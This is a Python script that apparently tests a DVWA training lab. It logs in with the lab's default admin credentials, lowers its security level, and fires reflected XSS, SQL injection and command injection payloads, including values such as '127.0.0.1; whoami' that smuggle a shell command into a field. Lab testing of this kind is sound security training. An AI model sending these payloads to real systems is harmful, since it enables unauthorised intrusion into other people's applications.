import json
import os
import requests
from datetime import datetime
from urllib.parse import urljoin

class DvwaLabTester:
    def __init__(self, profile_path):
        self.profile = self.load_profile(profile_path)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'DVWA-LAB-ASSESSMENT/1.0'
        })
        self.base_url = self.profile['target']
        self.results = {
            'start_time': datetime.utcnow().isoformat(),
            'target': self.base_url,
            'findings': []
        }

    def load_profile(self, profile_path):
        with open(profile_path, 'r') as f:
            return json.load(f)

    def login(self):
        login_url = urljoin(self.base_url, 'login.php')
        data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }
        try:
            response = self.session.post(login_url, data=data)
            return 'index.php' in response.text
        except Exception as e:
            print(f"Error during login: {e}")
            return False

    def run_assessment(self):
        print(f"Starting assessment of {self.base_url}")
        
        if not self.login():
            print("Failed to log in to DVWA")
            return

        print("Successfully logged in to DVWA")
        
        # Set DVWA security level to low for testing
        self.set_security_level('low')
        
        # Run vulnerability tests
        self.test_reflected_xss()
        self.test_sql_injection()
        self.test_command_injection()
        
        # Save results
        self.save_results()

    def set_security_level(self, level):
        try:
            security_url = urljoin(self.base_url, 'security.php')
            data = {'security': level, 'seclev_submit': 'Submit'}
            response = self.session.post(security_url, data=data)
            print(f"Security level set to: {level}")
        except Exception as e:
            print(f"Error setting security level: {e}")

    def test_reflected_xss(self):
        print("\n[*] Testing Reflected XSS...")
        test_url = urljoin(self.base_url, 'vulnerabilities/xss_r/')
        test_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            '{{7*7}}'
        ]

        for payload in test_payloads:
            try:
                response = self.session.get(test_url, params={'name': payload})
                if payload in response.text:
                    self.record_finding(
                        type="xss",
                        url=test_url,
                        parameter="name",
                        payload=payload,
                        status="vulnerable"
                    )
                    print(f"[+] XSS found with payload: {payload}")
            except Exception as e:
                print(f"Error testing XSS: {e}")

    def test_sql_injection(self):
        print("\n[*] Testing SQL Injection...")
        test_url = urljoin(self.base_url, 'vulnerabilities/sqli/')
        test_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT 1,2,3 --",
            "1' AND 1=CONVERT(int, (SELECT @@version)) --"
        ]

        for payload in test_payloads:
            try:
                response = self.session.get(test_url, params={'id': payload})
                if 'Welcome' in response.text or 'Syntax error' not in response.text:
                    self.record_finding(
                        type="sqli",
                        url=test_url,
                        parameter="id",
                        payload=payload,
                        status="potential"
                    )
                    print(f"[+] Potential SQLi with payload: {payload}")
            except Exception as e:
                print(f"Error testing SQLi: {e}")

    def test_command_injection(self):
        print("\n[*] Testing Command Injection...")
        test_url = urljoin(self.base_url, 'vulnerabilities/exec/')
        test_payloads = [
            "127.0.0.1; whoami",
            "127.0.0.1 | ls",
            "127.0.0.1 && echo test"
        ]

        for payload in test_payloads:
            try:
                response = self.session.post(test_url, data={'ip': payload, 'Submit': 'Submit'})
                if any(cmd in response.text for cmd in ['root', 'www-data', 'test']):
                    self.record_finding(
                        type="command_injection",
                        url=test_url,
                        parameter="ip",
                        payload=payload,
                        status="vulnerable"
                    )
                    print(f"[+] Command injection found with payload: {payload}")
            except Exception as e:
                print(f"Error testing command injection: {e}")

    def record_finding(self, type, url, parameter, payload, status="potential"):
        self.results['findings'].append({
            'type': type,
            'url': url,
            'parameter': parameter,
            'payload': payload,
            'status': status,
            'timestamp': datetime.utcnow().isoformat()
        })

    def save_results(self):
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        filename = f"dvwa_assessment_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\nAssessment complete. Results saved to {filename}")
        print(f"Total findings: {len(self.results['findings'])}")

if __name__ == "__main__":
    tester = DvwaLabTester('dvwa_lab_config.json')
    tester.run_assessment()
